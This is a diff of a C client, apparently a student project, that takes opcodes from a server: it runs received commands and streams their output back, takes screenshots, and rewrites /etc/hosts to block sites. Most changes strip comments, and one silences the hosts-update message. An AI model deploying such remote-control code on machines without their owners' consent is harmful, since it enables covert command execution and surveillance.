@@ -180,7 +180,6 @@ void expandRedirect(char **args)
         {
             if (args[i + 1] != NULL)
             {
-                // Open the file for writing (create if it doesn't exist, truncate if it does)
                 int fd = open(args[i + 1], O_WRONLY | O_CREAT | O_TRUNC, 0644);
                 if (fd == -1)
                 {
@@ -195,11 +194,10 @@ void expandRedirect(char **args)
                     exit(EXIT_FAILURE);
                 }
 
-                // Close the file descriptor as it's no longer needed (dup2 has duplicated it)
                 close(fd);
 
-                // Remove the ">" and the filename from the arguments
-                args[i] = NULL; // Terminate the arguments list at the redirection symbol
+                // Remove the ">" 
+                args[i] = NULL; 
                 break;
             }
             else
@@ -228,13 +226,13 @@ void handleCommandOpcode(message_t msg)
 
     if (pid == 0)
     {
-        // Child process
-        close(pipe_fd[0]); // Close the read end of the pipe
+        
+        close(pipe_fd[0]);
 
-        // Redirect stdout and stderr to the write end of the pipe
+        
         dup2(pipe_fd[1], STDOUT_FILENO);
         dup2(pipe_fd[1], STDERR_FILENO);
-        close(pipe_fd[1]); // Close the write end of the pipe after duplicating
+        close(pipe_fd[1]); 
 
         int argCount = 0;
         char *temp = strdup(msg.buffer);
@@ -260,13 +258,13 @@ void handleCommandOpcode(message_t msg)
         expandRedirect(args);
 
         execvp(args[0], args);
-        perror("Command"); // If execvp fails, print an error
+        perror("Command"); 
         exit(EXIT_FAILURE);
     }
     else if (pid > 0)
     {
         // Parent process
-        close(pipe_fd[1]); // Close the write end of the pipe
+        close(pipe_fd[1]); 
 
         // Read from the pipe
         char buffer[1024];
@@ -274,13 +272,13 @@ void handleCommandOpcode(message_t msg)
         message_t msg;
         while ((bytesRead = read(pipe_fd[0], buffer, sizeof(buffer) - 1)) > 0)
         {
-            buffer[bytesRead] = '\0'; // Null-terminate the string
+            buffer[bytesRead] = '\0'; 
             encapsulateMessage(&msg, buffer, 'M');
             sendMessage(clientData.serverSocket, &msg);
         }
 
-        close(pipe_fd[0]); // Close the read end of the pipe
-        wait(NULL);        // Wait for the child process to finish
+        close(pipe_fd[0]); 
+        wait(NULL);        
     }
     else
     {
@@ -313,7 +311,7 @@ void handleIpOpcode(message_t msg)
     // Read /etc/hosts line by line
     while (fgets(line, sizeof(line), hosts_file))
     {
-        // Check if the line contains a site starting with "www."
+        
         if (strstr(line, "www.") == NULL)
         {
             // If not, write the line to the temporary file
@@ -321,24 +319,24 @@ void handleIpOpcode(message_t msg)
         }
     }
 
-    fclose(hosts_file); // Close /etc/hosts file
+    fclose(hosts_file); 
 
-    // Process the msg.buffer to extract sites and append them to the temporary file
+    
     char *site = strtok(msg.buffer, "\n");
     while (site != NULL)
     {
         printf("Blocking: %s\n", site);
-        // Append each site to the temporary file, redirecting to 127.0.0.1
+        // Append each site to the temporary file redirecting to 127.0.0.1
         fprintf(temp_file, "127.0.0.1    %s\n", site);
         site = strtok(NULL, "\n"); // Get the next site
     }
 
-    fclose(temp_file); // Close the temporary file
+    fclose(temp_file); 
 
-    // Replace /etc/hosts with the updated temporary file
+    
     if (rename("/tmp/hosts.tmp", HOSTS_FILE) == 0)
     {
-        printf("Updated /etc/hosts successfully.\n");
+        //printf("Updated /etc/hosts successfully.\n");
     }
     else
     {
@@ -356,7 +354,7 @@ void handleOpcode(message_t msg)
     case 'S':
         handleScreenshotOpcode();
         break;
-    case 'C': ///////De adaugat si in Obsidian
+    case 'C': 
         handleCommandOpcode(msg);
         break;
     case 'B':
